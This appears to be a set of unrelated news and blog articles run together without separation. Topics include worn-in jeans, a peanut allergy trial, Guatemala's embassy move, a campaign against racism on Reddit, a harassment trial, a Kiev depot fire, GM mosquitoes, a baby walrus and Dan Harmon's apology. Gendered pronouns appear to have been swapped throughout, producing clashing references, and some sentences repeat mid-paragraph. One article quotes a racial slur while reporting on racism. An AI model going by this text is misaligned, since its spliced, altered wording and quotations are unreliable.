Althought their main focus is on the environment – “80% of the environmental impact of jeans come from washing and ironing,” explains David. “It's shocking.” –they've cottoned onto the fact that the demand for weathered, vintage and distressed denim is close to peaking point. “90% of our buyers want jeans that look old. APC in Paris, for example, buys back old jeans and resells them, often for more money. Good denim often looks better when it's been worn a bit.”
All of which explains their denim breaking. “Eight months ago, we sent jeans out to 50 breakers. They're sort of a club. The idea is that they wear them in for us and then we sell them on. We've just about got them all back. We're washing them – well, a guy who has been washing jeans for 30 years is – and on Monday we'll auction them off. The idea is that you break the denim in for the customer. It's an experiment but so far, so good.”

“I was one of the first breakers. They are the best jeans I've owned. I got involved because I've known David for a long time, as I used to run a clothing company. They told me about the idea and I signed up, paying an £80 deposit.
“When I handed them back, of course they smelled bad. I wore them every single day for six months. Literally. I don't wear a suit, you see. I live in Belfast and I work in Hollywood down the road, and I cycled to work every day. I went to the rugby in them with my thermals underneath. They got soaked in the cold and rain, and so they spent a lot of time hanging and drying above a radiator. One day, when it was warm, I went and lay on the beach in them. I went to the supermarket in them, I cooked in them, I drank in them. I didn't spill anything serious on them, thankfully. I also carved spoons in them, so by the end they were pretty covered in wood shavings.
“No one borrowed them, but someone did steal the first pair quite early on. I live in a flat and one day I hung them out on the washing line to dry. I don't know if I was followed or if someone knew the jeans were expensive. I had to start again.
“I guess you could say it was a job. I'll get 20% of the sale price. The thing is, by wearing them I'm adding value to them. Luckily, they wash them first [before they are sold]. If you wear something every day, it will smell. But it's necessary – good raw jeans, when you get them, are like wearing cardboard. I think the idea is that someone will inherit them from me. It is anti-throwaway fashion.”

LONDON -- An experimental therapy that fed children with peanut allergies small amounts of peanut flour has helped more than 80 per cent of them safely eat a handful of the previously worrisome nuts.
Although experts say the results of the carefully monitored study are encouraging, they warn it isn't something that parents should try at home.
Peanut allergies are on the rise globally and affect about 1 in 50 children, mostly in high-income countries. The consequences can be life-threatening -- peanuts are the most common cause of fatal food allergy reactions. There is no way to avoid a reaction other than just avoiding peanuts. Allergy shots used for environmental triggers like pollen are too risky.
Doctors at Addenbrooke's Hospital in Cambridge started by giving 99 children aged seven to 16 with severe peanut allergies a tiny 2-milligram dose of a special peanut flour mixed into their food. Slowly they increased that amount to 800 milligrams. The dose increases were given at a research facility where the children were observed for any dangerous side effects -- the most frequent were itchiness in the mouth, stomach pains or nausea.
After six months of treatment, more than 80 per cent of the children can now safely eat five peanuts at a time.
"This made a dramatic difference to their lives," said Dr. Andrew Clark of the University of Cambridge in Britain, who led the research. "Before the study, they could not even tolerate tiny bits of peanuts and their parents had to read food labels continuously."
The intention of the treatment isn't to help kids eat large amounts of peanuts, but to prevent a life-threatening allergic reaction in case they accidentally eat trace amounts.
Clark said the treatment works by retraining the patients' immune systems so they can gradually build up a tolerance to peanuts, though they guessed they might need to keep taking it for several years. They and colleagues plan to offer the treatment soon in a special peanut allergy clinic as well as beginning larger studies.
The study was paid for by Britain's Medical Research Council and the National Institute for Health Research. It was published online Thursday in the journal, Lancet.
In an accompanying commentary, Matthew Greenhawt of the University of Michigan described the study's results as "exceptionally promising" but predicted the treatment was still "years away from routine clinical use." They noted that previous research which used a similar approach for milk allergies had failed and said it was unknown if the peanut therapy could produce "lasting tolerance."
Unlike other childhood food allergies, children rarely outgrow a nut allergy. Schools across Canada and the United States have taken a host of measures to combat the problem, some airlines have stopped serving packaged nuts and there's been a fierce debate over whether peanut butter should be banned from schools.
Lena Barden, 12, used to suffer serious swelling and breathing problems after eating just a trace amounts of nuts. But since they joined the study more than two years ago, Barden's tolerance has grown and they now eat five peanuts a day. While Barden says they still hate peanuts, the trial has allowed them to indulge in previously forbidden treats.
"I'd never tried a doughnut before I was 11 because they (could) contain traces of nuts," they said.
Then a friend bought a pack and offered them one.
"It was amazing," they said. "I ate the entire packet."
Microsoft is unveiling a new Whiteboard app for Windows 10 today. It's an app that's designed for the company's Surface devices, and provides two-way inking for Windows 10. Currently in private preview for Surface Hub devices, the new whiteboard includes collaborative inking, geometry recognition, table conversion, and automatic table shading. It's really designed to let people share ink across multiple devices, and will be available on all Surface devices later this year.
Alongside the new Whiteboard app, Microsoft is also making improvements to the inking experience in its Office apps. Pencil texture and new ink effects will be available in Word, Excel, and PowerPoint for Office 365 subscribers next month, and Microsoft has also created a digital pencil case that lets you personalize your favorite pens, pencils, and highlighters and sync them to all Windows 10 devices.
Office will also support the new Surface Pen low-latency and tilt options. This means you'll be able to adjust the thickness and texture of ink in Office apps just by physically tilting the Surface Pen on the new Surface Pro.
Guatemala says it is moving embassy in Israel to Jerusalem

GUATEMALA CITY (AP) — Guatemala's president announced on Christmas Eve that the Central American country will move its embassy in Israel to Jerusalem, becoming the first nation to follow the lead of U.S. President Donald Trump in ordering the change.
Guatemala was one of nine nations that voted with the United States and Israel on Thursday when the U.N. General Assembly overwhelmingly adopted a non-binding resolution denouncing Trump's recognition of Jerusalem as Israel's capital.
Trump didn't set any timetable for moving the U.S. Embassy from Tel Aviv to Jerusalem, and neither did Guatemalan President Jimmy Morales.
In a post on their official Facebook account Sunday, Morales said that after talks with Israeli Prime Minister Benjamin Netanyahu, they decided to instruct Guatemala's foreign ministry to move the embassy.
Palestinian Foreign Minister Riyad al-Malki criticized the decision Monday, saying in a statement Morales was “dragging their country to the wrong side of history by committing a flagrant violation of international law.”
Al-Malki called it a “shameless act of lawlessness” and “a brazen act of disrespect and disregard” to international alliances of which Guatemala is part.
Guatemala and Israel have long had close ties, especially in security matters and Israeli arms sales to Guatemala.
No other country has their embassy for Israel in Jerusalem, though the Czech Republic has said it is considering such a move.
In a statement, Netanyahu praised Morales' decision and said that they were waiting in Jerusalem.
“God bless you, my friend, President Morales,” they said. “I told you recently that there will be other countries that would recognize Jerusalem and announce the transfer of their embassies to it. Well here is the second country and I reiterate: It is only the beginning and it is important.”
Trump upended decades of U.S. policy with their Dec. 6 announcement that they were recognizing Jerusalem as Israel's capital. Though Trump said they were merely recognizing reality and not prejudging negotiations on the future borders of the city, Palestinians saw the move as siding with Israel on the most sensitive issue in the Israel-Palestinian conflict.
Israel claims all of Jerusalem as its capital, while the Palestinians claim the city's eastern sector, which was captured by Israel in 1967 and is home to sensitive religious Jewish, Muslim and Christian sites. Many governments have long said that the fate of Jerusalem must be resolved through negotiations.
Trump's announcement has set off weeks of clashes between Palestinian protesters and Israeli security forces that have left 12 Palestinians dead.
Netanyahu has made great efforts to reach out to Latin America in recent years as part of a campaign to counter longstanding support for the Palestinians at the United Nations.
The resolution passed by the General Assembly declared the U.S. action on Jerusalem “null and void.” The 128-9 vote was a victory for Palestinians, but fell short of the total they had predicted. Thirty-five nations abstained and 21 stayed away from the vote.
Image caption Late nights may have knock-on effects
Late nights and lax bedtime routines can blunt young children's minds, research suggests.
The findings on sleep pattern and brain power come from a UK study of more than 11,000 seven-year-olds.
Youngsters who had no regular bedtime or who went to bed later than 21:00 had lower scores for reading and maths.
Lack of sleep may disrupt natural body rhythms and impair how well the brain learns new information say the study authors.
They gathered data on the children at the ages of three, five and then seven to find out how well they were doing with their learning and whether this might be related to their sleeping habits.
Establishing a good bedtime routine early in childhood is probably best, but it's never too late Study author Prof Sacker
Erratic bedtimes were most common at the age of three, when around one in five of the children went to bed at varying times.
By the age of seven, more than half the children had a regular bedtime of between 19:30 and 20:30.
Overall, children who had never had regular bedtimes tended to fare worse than their peers in terms of test scores for reading, maths and spatial awareness.
The impact was more obvious throughout early childhood in girls than in boys and appeared to be cumulative.
The researchers, led by Prof Amanda Sacker from University College London, said it was possible that inconsistent bedtimes were a reflection of chaotic family settings and it was this, rather than disrupted sleep, that had an impact on cognitive performance in children.
"We tried to take these things into account," said Prof Sacker.
The children with late and erratic bedtimes came from more socially disadvantaged backgrounds and were less likely to be read to each night and, generally, watched more TV - often on a set in their own bedroom.
After controlling for such factors, the link between poorer mental performance and lax bedtimes remained.
The findings are published in the Journal of Epidemiology and Community Health.
Prof Sacker said: "The take-home message is really that routines really do seem to be important for children.
"Establishing a good bedtime routine early in childhood is probably best, but it's never too late."
They said there was no evidence that putting children to bed much earlier than 19:30 added anything in terms of brain power.
Dr Robert Scott-Jupp of the Royal College of Paediatrics and Child Health said: "At first glance, this research might seem to suggest that less sleep makes children less intelligent, however, it is clearly more complicated than that.
"While it's likely that social and biological brain development factors are inter-related in a complex way, in my opinion, for schoolchildren to perform their best, they should all, whatever their background, get a good night's sleep."

On Reddit, your next door neighbor could be a delightful geek or the most virulent white supremacist this side of ‘American History X.'
The site's farcical ‘quarantine' policy is nothing but a sop to advertisers who are already wary of the chaos. Just because you say you're not making money from a particular horror show, doesn't mean you don't benefit from the individuals who perpetrate them.
That's why I was delighted to speak to Casey Stephens – not their given name – the leader of That's why I was delighted to speak to Casey Stephens – not their given name – the leader of Operation Reddit Shine (ORS) , which is actively fighting to encourage Reddit to properly tackle the white power cancer that is eating away at it.
Man, it's crazy how many right-wing extremism accounts are on reddit. Pick a post about racism or guns for example & the comments are nuts. — Paw & Order (@theSmudgiestCat) — Paw & Order (@theSmudgiestCat) August 12, 2015
The campaign is focused on petitioning Reddit advertisers, encouraging them to drop their support for the site until it takes stronger action to deal with hate speech on its platform. The campaign is focused on petitioning Reddit advertisers, encouraging them to drop their support for the site until it takes stronger action to deal with hate speech on its platform. Banning /r/Coontown was a start, but the group believes the site must go much, much further. I agree
ORS' first target was Audible. It was successful in getting the audiobook company to pull its advertisements, and now has ORS' first target was Audible. It was successful in getting the audiobook company to pull its advertisements, and now has a second petition to Reddit advertisers with more than 32,000 signatures at the time of writing.
Obviously, I put the ‘First Amendment' case to Casey Stephens, the leader and spokesperson for the group – a small business owner in their late-twenties, who is married and has children – as that's the one their critics will keep throwing at them They were very clear:
Reddit, as a private corporation, is not required to abridge its first amendment rights by supporting speech that it sees as harming society and/or its own bottom line, so people making the argument that social justice warriors (SJWs) or Reddit, in proposition restrictions, are abridging their free speech rights by preventing them from using this particular website to express themselves are misguided.. Reddit is also not required to restrict its free speech rights to support our position either. Everyone in this debate – here in the US – is protected from the government infringing on our free speech rights, but the First Amendment does not protect anyone from the private consequences of their speech. If Reddit – a private company – is going to support the spread of racism by giving it space and resources on its site, then I can and will use my first amendment rights to make that a difficult position for them to take in the marketplace. I am within my rights to do so.
They also tackle the suggestion by Reddit's own executives, including returning co-founder and new CEO Steve Huffman, that ORS' campaign is a crusade against obscenity:
It's not about me or others trying to stop speech we merely find offensive. I am specifically trying to stop speech that literally only does harm. If a society truly intends to protect all its citizens from violence and untimely death, there is no good reason to dedicate space to speech arguing that some people's human rights should be abridged on the basis of inherent personal characteristics like race, gender, or sexuality. Reddit is currently overrun by people who are actually asking the question, ‘What should we do about the nigger problem?' and proposing violent solutions like deportation and genocide. Reddit has people who are very adamantly pushing back on the idea that black people shouldn't be shot with impunity by police with subreddits like /r/BlackCrimeMatters, which explicitly tries to create the misleading impression that violent crime is rampant in the black community and justify police violence. If we take seriously the idea that black Americans have basic human/civil rights, there is no reason to debate our right to life; it is a waste of time and resources to treat this speech like valuable discussion could come from it. People of color should not constantly be forced to re-litigate the idea that we have basic human rights that should not be abridged for any reason. That should be a given, not up for debate.
If, at this point, you are still unconvinced that ORS' efforts are not required, chew on this: White supremacists at the virulently racist Daily Stormer site If, at this point, you are still unconvinced that ORS' efforts are not required, chew on this: White supremacists at the virulently racist Daily Stormer site have discussed how to use Reddit as a staging post for recruitment.
Then there's Then there's evidence from the Southern Poverty Law Center that show members of ‘echo chamber' forums like /r/Coontown and the notorious hate site Stormfront are more likely to commit hate crimes and, in the most extreme cases, homicide. The residents of Coontown didn't flee the site, they moved to other subreddits.
Stephens has been on Reddit for just under two years and classes themselves as a “mainstream Redditor.” They believe that white nationalists find the site appealing as an “extremely white, extremely unrestricted space.” As the Daily Stormer comments linked early see it “a fertile recruitment ground.”

They claim that memes from /r/Coontown have circulated among police officers and believes that there is a real threat from voices on Reddit trying to take white nationalism mainstream: “They are trying to exploit casual racism to produce more actual racist activists.”
This year has been a particularly bleak one for deaths in the black community at the hands of the police. Stephens sees Reddit as an element in a war on black people:
We have a huge policing crisis, even as crime declines. Black people are literally dying because of stereotyping . Reddit is a unique case. Because of its size and reach, it offers a unique opportunity for racists. But there's also a big chance for those of us pushing back against them.
Stephens wants to see Reddit banning subreddits dedicated to hate and shutting down Stephens wants to see Reddit banning subreddits dedicated to hate and shutting down the rest of the racist ‘Chimpire' of which /r/Coontown was just one part.

A British Columbia man convicted of criminally harassing their ex-wife says they created a revenge website to destroy their reputation because they insulted them in e-mails and had them deported without their teenage son.
Patrick Fox told their sentencing hearing on Tuesday in B.C. Supreme Court that they blame Desiree Capuano for their deportation from the U.S. in 2013 following their conviction for perjury. They had custody of their son at the time.
"If they had allowed (our son) to choose where they were going to live ... maybe I might not have felt or believed that Desiree was such an evil person that the whole world should know the kind of person they are," they said.

Fox was found guilty by a jury in June of criminally harassing Capuano through threatening e-mails and the website, which maligns them as a white supremacist, drug addict and child abuser. They also posted private photos and their phone number and address.
They repeatedly defended their online posts on Tuesday and claimed that the allegations are all true to the best of their knowledge.
Fox, a Canadian citizen, testified that Capuano informed U.S. authorities that they were staying in the country illegally following their perjury conviction. They said that after border agents dropped them off at the Washington state-B.C. border in 2013, they were homeless for a period.
Crown counsel Mark Myhre questioned Fox about the factual basis for blog posts in which they described Capuano's fiance as a drug user and Capuano as a white supremacist. The posts are written as if they are the author, with titles including, "Yes, I am a racist."
Fox responded that they assume their fiance uses caffeine, which is a drug, and pointed to an e-mail in which Capuano compared them to a "dirty Mexican."
They also defended a post in which they described the logistics of travelling to Arizona, where Capuano lives, and shooting them They said they were merely responding to their allegation in a CBC story that they feared they would cross the border to shoot them
"Otherwise, it would be a situation where Ms. Capuano could go on the news and say anything they want about me and I can't defend myself at all," they said.

They also alleged that Capuano has not taken meaningful steps to get the website taken down. Myhre responded that they repeatedly complained to police, as well as the company that hosts the website, and went to an Arizona court to get a protective order.
"I don't believe they really wants it taken down," Fox replied.
Fox arrived at the sentencing hearing on Tuesday in a red prison jumpsuit and carrying a stack of 700 pages of e-mails, dating back to 2011, which they alleged showed that Capuano and their fiance had threatened and taunted them for years before they created the website.
Myhre told the judge that Fox had initiated many of the conversations.
"They amount to nothing more than petty squabbling ... and just don't possibly amount to the kind of thing that might be considered provocation," Myhre said.
Fox also submitted to the court audio recordings of radio and television interviews Capuano conducted. They said a CBC story in February 2016, which prompted widespread media coverage, made them look like a "monster."
Story continues below advertisement
They said Capuano's "false claims" and the negative media attention cost them their job, friends and business associates. Their favourite restaurants stopped serving him, they added.
Capuano has also filed a lawsuit against Fox alleging defamation, emotional distress, intimidation and loss of economic opportunities.  They are seeking damages and an order requiring Fox to take down the website.
None of the allegations contained in the notice of civil claim has been proven and Fox has not yet had an opportunity to respond.
The sentencing hearing is expected to continue through Wednesday.

The Kansas City Chiefs will hit primetime on Thursday night for the NFL's season opener. The Chiefs have played some big games before but this is among the biggest. The first game of the year against the defending champs with NFL fans watching no one but the Chiefs and Patriots. Outside of the playoffs, the stage doesn't get much bigger than this.
For Tyreek Hill, that's a good thing. They love playing under the lights in primetime.
“Like I said last year,” Tyreek told reporters this weekend, “I just like playing under the lights because it reminds me so much of playing in front of my hometown, like Friday Night Lights. It's crazy, so I'm always trying to make that big play up under the lights because everyone's watching.”
Why should Chiefs fans like that they're in primetime? Because Tyreek shows the F up in primetime. Last season, they had seven of their 12 touchdowns in primetime. When I say Tyreek and primetime I think of the Broncos overtime game where they balled out and the Raiders game at Arrowhead on Thursday night where they put a clown suit on Raiders punter Marquette King.
The Patriots are 100 percent going to have a plan for Tyreek. Bill Belichick tries to take out what you do best and after Travis Kelce that has to be Tyreek.
I'm pumped.
Heavy casualties feared in fuel depot explosion near Kiev
A huge fire and explosion on Tuesday at a fuel depot outside the Ukrainian capital of Kiev may have caused heavy casualties, authorities said.
The explosion near Vasylkiv town, 38 km south of Kiev, was "gigantic" and "firefighters have died," said Interior Minister Arsen Avakov on Twitter.
According to the State Service for Emergencies, the explosion happened at around 8 a.m. local time (GMT 0500) at the oil depot, which stores about 8,500 cubic meters of oil, triggering a massive fire.
A total of 17 oil tanks were involved in the fire, with each estimated to hold from 50 to 900 cubic meters of fuel.
As of midday local time (GMT 0900) one person was confirmed dead following the explosion, and 10 were taken to local hospitals with burns, including four employees of the oil depot and six firefighters.
The Interior Ministry said it has lost contact with three firefighters.
The authorities have urged people to leave the dangerous area while firefighters are preparing to use foam to stop the blaze spreading to another storage depot and a forest nearby.
More than 300 rescuers and firefighters are working on the spot.

Dengue fever is an alarming disease. According to World Health Organization estimates, 390 million dengue infections occur annually, with almost 25 percent of those severe enough to require hospitalization. The global incidence of the disease has rapidly increased in the recent years, and now, roughly half of the people in the world are at risk of catching it.
While treatable if caught earlier enough, the most challenging aspect of dengue fever has traditionally been its method of transmission. Along with other tropical diseases like Zika, yellow fever, and chikungunya, the dengue virus is carried by mosquitoes. These insects thrive in the world's tropical areas, which are where 2.5 million, or 40 percent, of the global population lives. Instead of focusing on treatment methods, scientists from Brazil have a novel plan to eradicate the virus by targeting the diseases carriers themselves.
Together with a British insect control firm, these scientists plan to release millions of factory-bred mosquitoes, named OX513A, into the wild to mate with the females of the disease-carrying mosquito species. Through genetic engineering, the offspring of these interactions would have a defect that would shorten their lifespan. The factory-bred mosquitoes themselves also have the genetic defect, so they would die soon after mating.
Eradicate The Vector, Eradicate The Disease
Oxitec, the firm responsible for developing and breeding OX513A, already has a plant in Piracicaba, a town northwest of São Paulo, where it could produce over 60 million of these genetically engineered mosquitoes in a week. Even though the firm doesn't yet have a sales permit from Brazil's Anvisa health authorities, Piracicaba signed a four-year, $1.1 million deal with Oxitec to have the firm release 10 million of its mosquitoes into the town each week.
Almost all the pillars of President Trump's presidency — immigration, jobs, mistrust of allies, coloring Washington as a feckless, greedy swamp — can be traced back to one of their core beliefs: America is getting shafted by the rest of the world.
The president has hinted or outright said as much in nearly every major international speech he's given since becoming president, including Tuesday's remarks at the United Nations: “I will always put America first just like you, the leaders of your countries, should put your countries first,” they said.
On the campaign trail, they tied nearly every one of their core issues to their “America first” doctrine, which is based on the idea that America is struggling at the hands of the rest of the world.
On immigrants crossing the U.S.-Mexico border: “When Mexico sends its people, they're not sending their best. They're not sending you. They're not sending you. They're sending people that have lots of problems, and they're bringing those problems with us. They're bringing drugs. They're bringing crime. They're rapists. And some, I assume, are good people.” — June 2015 presidential announcement
On U.S. jobs: “They're not good jobs, they're bad jobs. We're losing, you know, when you see a Carrier move into Mexico, those are good jobs. We're losing the good jobs.” — March 2016 interview with New York Times' Maggie Haberman and David Sanger
On trade: “We don't put America first. We have these horrible, horrible trade negotiators. I actually think they're not as stupid as people think. I think that they actually want to help everybody else. They want to help everybody but our country. We are going to have a policy of America first. Make America great again.” — June 2016 speech in Redding, Calif.
On politicians: “We are going to put America first, and we are going to make America great again. This election will decide whether we are ruled by the people, or by the politicians.” — March 2016 speech to the American Israel Public Affairs Committee
On engagement abroad: “We have been disrespected, mocked and ripped off for many many years by people that were smarter, shrewder, tougher. We were the big bully, but we were not smartly led. And we were the big bully who was — the big stupid bully and we were systematically ripped off by everybody.” — March 2016 New York Times interview
Fact checkers and mainstream economists disagree with many of the statistics Trump used to shape this view of the world. Trade deficits are not the best way to measure how fair trade is. NATO members are not paying too little as compared with the United States. Trump had to delegitimize official U.S. job numbers as “phony” to try to make their case that the U.S. economy is in turmoil.
But fact checking the president raises another question we have to explore to understand why the insular brand of “America first” has become the foundation of Trump's presidency: Why would they sell a worldview that the facts don't support? Especially when the rest of the international order is going in the opposite direction, operating under a shared belief that opening borders and cooperation is the best way to protect each country's own national interests.
Trump bragged to the New York Times in that March 2016 interview that they thought the United States has been on the wrong track since at least the World War II era. So perhaps this has always been their worldview, and they haven't bothered to update it with the realities of globalization.
But the message that the United States isn't working is also an odd one coming from a successful business person who has made billions in this country and others.
It is, however, a convenient worldview if you want to win a presidential campaign against more experienced candidates. If you can convince enough voters that the United States has been on the wrong track as long as the politicians have been in charge, you have a shot at winning. And that's exactly what Trump did: blamed politicians for letting the rest of the world steamroll the United States, promised to reverse course and won the presidency against all odds.
That's why it's important to note that Trump's “America first” doctrine can't easily be separated from another defining theme of their campaign: that the world is a dark, dark place, and no country is struggling more right now than the United States.
In their inauguration speech, they described the nation they were about to inherit as “American carnage.”
“Mothers and children trapped in poverty in our inner cities; rusted out factories scattered like tombstones across the landscape of our nation; an education system flush with cash, but which leaves our young and beautiful students deprived of all knowledge; and the crime and the gangs and the drugs that have stolen too many lives and robbed our country of so much unrealized potential.”
U.S. politicians have let the world take advantage of America, which is now literally in carnage. It's on those two core beliefs that Trump built nearly every pillar of their campaign and their presidency.
Much of it doesn't comport with the facts, but it sure was an effective message to win the presidency.
A Virginia Tech homecoming candidate sent a letter to Sub Pop in hopes of Nirvana shooting a video to endorse their campaign. We know what you're thinking. Why would they ask Nirvana to shoot a video if Nirvana has not been a band in nearly twenty years. Well, the thing is, is that this young woman apparently did not know Kurt Cobain died many years ago. Don't believe us? Go ahead and read their letter to Sub Pop below after the jump.
Earlier today in the Sub Pop mailbag, we received an enthusiastic message from a college student running for homecoming queen. They asked for a video affirming support from our one time recording artists, Nirvana, in order to aid their campaign in becoming homecoming queen. We dressed up and obliged.
Video forthcoming with the script: “What's up Virginia Tech? This is Nirvana! Just wanted to wish you guys a Happy Homecoming Week and good luck at the game this Saturday. LET'S GO HOAGIES!” Or something like that.
As Kazakhstan is a country far, far away, the information about the three Latvians playing for Beibarys Atyrau is usually far from being easily found, however recently some team statistics were released, making it possible for us to evaluate Latvian performance so far.
GP GAA SVS% TOI G 33 Martins Raitums 16 1.54 94.17 974.28
Martins Raitums, who was presented in summer as one of the biggest names to join the Kazakh league so far, is currently the starting goalie of Beibarys. Still, the second goalie Vadim Seliverstov has played a solid amount (14) of games too. And, no matter in how competitive league a goalie is playing, a SVS% of 94.17 is still a very respectable figure.
GP G A P PIM +/- D 29 Kaspars Astasenko 14 1 1 2 24 -1
The 35-year-old Latvian defender was released from the club already more than a week ago. Their return to the professional ice hockey, after not playing for the whole 2009-10, didn't turn out as successfully as they might have wished. Earlier in the season they did not play at all, in order to regain their form, however after 14 games played they were released from the club. It is said that the reason behind it was Astasenko's lack of attitude.
GP G A P PIM +/- D 10 Ricards Birzins 10 0 0 0 6 +1
Latvian defender Birzins, who played for Dinamo Riga farm club last season, has found themselves dressed for only 10 out of 30 Beibarys games so far and they are one of seven Beibarys defender with a positive +/-. This season there have been a total of 13 defenders playing for Beibarys.
GP G A P PIM +/- F 21 Andrejs Smirnovs 22 2 7 9 36 +3
27-year-old Andrejs Smirnovs is a regular player on Beibarys roster, and on the team's top scoring list they are ninth. The team's top scorer currently is Andrei Pelevin with 27 points.

A lone baby walrus that last week hauled onto a gold mining barge in the Bering Sea off the coast of Nome is being rehabilitated at the Alaska SeaLife Center in Seward.
The 120-pound male calf showed up Wednesday, was flown to the center on Saturday, and is being cared for by volunteers and staff at the center's rehabilitation unit within view of the public, said the center's president and chief executive, Tara Riemer.
"He was very dehydrated when they got here," Riemer said. That is typical for stranded marine mammals. "It's a little too early to say they are out of the woods."
Walruses are highly social. This little critter – estimated to be 2 weeks old – stays close to staff and usually falls asleep up against whoever is closest, they said.
The crew of the AU Grabber, a gold mining dredge, discovered them on board, and they were still there when they returned the next day after spending the night in Nome.
The dredge was in the middle of open water. No mother walrus was nearby.
On Friday afternoon, the crew called the SeaLife Center's stranded marine animal hotline, which was the right step, Riemer said. The U.S. Fish and Wildlife Service, which has authority over walruses, was brought in. The Eskimo Walrus Commission also was contacted. Authorities signed off on removing the animal from the wild. Gay Sheffield, a University of Alaska Fairbanks assistant professor based in Nome, was the local responder for the move.
Anyone who finds a stranded marine mammal or seabird is urged to call the SeaLife Center's hotline – 888-774-SEAL or 774-7235 — first thing, before touching, approaching or moving the animal.
In the wild, walruses stay with their mothers for two years as part of a herd. Those recovered young, like this one, aren't candidates to be returned to the wild later on.
"There's no way we can teach them how to find clams on the ocean floor. It's not possible," Riemer said.
The young walrus flew in a fish tote on a Northern Air Cargo flight from Nome to Anchorage, where a SeaLife Center team including a veterinarian was waiting to check them over. They traveled, still in the dry tote, by pickup to Seward.
Flipper-footed pinnipeds can survive long stretches out of the water. This animal has a few sores, so it is doing better on dry land for now, the SeaLife Center says.
The walrus doesn't yet have an official name, though the gold mining crew started calling them Nugget.
They haven't yet taken to a bottle, so is tube fed, multiple times a day, a watered-down, electrolyte-rich concoction designed for young marine mammals. It's sort of like a mix of walrus milk and Gatorade.
Meanwhile, visitors can watch through a bank of windows.
"If he's sleeping, leaning against someone's shoulder, then that's what you'll see. If he's being tube fed, that's what you'll see. If he's just urinated and they are cleaning it up, then that's what you'll see," Riemer said.
The rehab area that the center calls I.Sea.U. is a large quarantine space with a pool that for this early recovery time is not filled.
The SeaLife Center doesn't have space for adult walruses. If they recover, they will be sent to a zoo or aquarium, preferably one with other walruses, Riemer said. Only about 15 walruses are in captivity in the United States, they said.
The center last rehabilitated a group of stranded young walruses in 2012. One soon died. Of the two survivors, one went to the Indianapolis Zoo and the other to the New York Aquarium.
Most people never get to see a baby walrus.
From ‘The food shortage and how to meet it', The Spectator, 2 December 1916: A rise in prices, if properly understood and properly used, will be our salvation, not our injury. High prices help conservation, and, what is still more important, they help supply… If we artificially cut down prices here, we sterilise instead of stimulating the impulse to feed us from abroad. We are in effect saying to the world: ‘If you are such fools as to send us food, we warn you that you are not going to obtain inflated prices. You will get nothing more here than what we choose to tell you is a fair price. Our people, even if they want to do so, are not going to be allowed to pay you a penny more than we think suitable.' Instead of this we must let high prices hoist to the whole world the cheery signal: ‘Here's your chance.'
OK, yes, technically, the news here is that Dan Harmon has apologized for knocking Community's fourth season (the one they had no involvement with) in graphically over-the-top fashion. On their Harmontown podcast, they called watching it like “flipping through Instagram just watching your girlfriend blow everyone” and “being held down and watching your family get raped on a beach.” And for that, they are truly sorry: “After five seconds of thinking, I realized, as usual, that other people might be hurt, and that I really need to do this whole ‘saying things and thinking about other people' cycle in a different order at some point.”
They went on Tumblr and issued that apology quickly, first to the fans, then the cast and crew, then the writers themselves; they never meant to make anyone feel silly for having invested their time in the season, or for having worked their asses off to make it. It was a considered, sensitive response, and it's hard not to buy it. But as Harmon themselves has made clear, over and over, this is what they do: They talk shit constantly because they find themselves — as do many, many other people — endlessly fascinating. At some point, that gets them in trouble, which isn't necessarily something they didn't know would happen as soon as they opened their mouth. In response, he'll do something somewhere on the spectrum of justification, equivocation, and out-and-out apology. Everyone'll move on. Then [insert that little arrow-loop on iTunes that puts your songs on repeat].
Of course, in complete Harmon style, this is something he'll readily admit to you. You can read Harmon's entire apology here, but a few choice cuts represent the man in general. First, before actually getting into the meat of the situation, they take the time to plug their podcast — coincidentally, their one outlet for complete, unfiltered Harmonization: “During my award winning Harmontown podcast … which is available for free and, for those interested, is a joyfully overflowing source of opportunities to dislike me, I vented some spleen about the allegedly traumatizing experience of binge-watching a season of TV I didn't get to control (cue microscopic violin). Laughs were had, I felt better, I cried about my Dad, we played Dungeons and Dragons — it's a great podcast.” Later: “I love talking about myself, but, trust me, this has been more pain than pleasure for the guy that made you feel bad.” They also declare he'll stop discussing the show on Harmontown until production is wrapped: “That will protect the show you love, and your love of it, from the creator with the Mouth from PR Hell.”
OK, now, here's the thing with that last bit. Whether or not Dan Harmon gets in trouble on Twitter has no impact on the ratings for their show: The only people invested in the Twitter wars are the obsessives already watching Community no matter what. Where it does matter, presumably, is Harmon's relationship with the network and studio: It's safe to say that if they weren't as much of an outspoken dude, maybe they wouldn't have gotten fired. But then they got rehired to Community anyway, so we're back to square one. So, regarding the Mouth From PR Hell — if there is any impact here, it's on Harmon personally. They know damn well that every single one of these little tiffs, ultimately, does little more than solidify the Dan Harmon Brand. Basically: Dan Harmon is in the Dan Harmon business. And business is good.

My Japanese sucks, but it looks like the (preliminary?) tournament goes into full gear, and Touta may be meeting someone who knew Negi. I see a reference to Karin here, but not sure about it. I get no sense of Kuroumaru nor Kirie being in the tournament. I didn't expect them to be though since this is supposed to be Touta getting stronger. I do think Kuroumaru attempted to report Hoodie's bombing, but only got voice mail (I think).
Well, hopefully the ever gracious ChaosProphet can give us the full scoop if they have time.
In the meantime, I'll keep my eyes open for more info or spoiler images, should they appear.
Update #1: Rikutan offers this bit of clarification:
Basically, Touta alone enters the underground tournament, enters the A-rank, fights the cat-girl Karen, and then goes up against the 8-armed demon Morborgran, who fought and lost against Negi in MM. Morborgran advises Touta to get a finishing move…
Finishing moves…been there, done that. *_*
Anyway, thanks to Rikutan for this.
Update #2: We now have a spoiler image from 2ch.
Touta's finishing move trainer after this fight?
More updates if I get them.
Update #3: Another spoiler image from MK.
So this must be the Karen mentioned.
OK, chapter comes out tomorrow.
Green Party MP Chloe Swarbrick has turned out to support protesters at the annual defence industry conference, held this year in Wellington.
The 23-year-old MP said they came out to show their support this morning because New Zealanders need to "stand up" for change.
"I think it's really important to be revaluating what we stand for as a country.”
"I think it's really crucial that we do things like protest, that we do stand up, that we do have those difficult and uncomfortable conversations because otherwise nothing is ever going to change."
The week-long conference is being held in Westpac Stadium today and tomorrow, experts at the New Zealand Defence Industry Association forum will be discussing topics, such as "emerging technologies" and cybersecurity.
But gathered outside, protest groups are hoping to disrupt and blockade the event.
Calling for more people to join them, protest spokesperson Jessie Dennis from Peace Action Wellington has promised "food, music and entertainment".
"It's important to act and to target the drivers of war, those who make billions of dollars from killing people," Dennis said.
"Tomorrow is our opportunity to shut down their business, to mess with their profit and to ultimately make the world a better and safer place."
Protesters have in recent years turned the forum into an annual rallying cry against war, violence and the weapons industry.
Two years ago, more than two dozen were arrested after 75 people, one dressed as the grim reaper and others holding masks of former prime minister John Key, locked arms to stop delegates entering the forum.
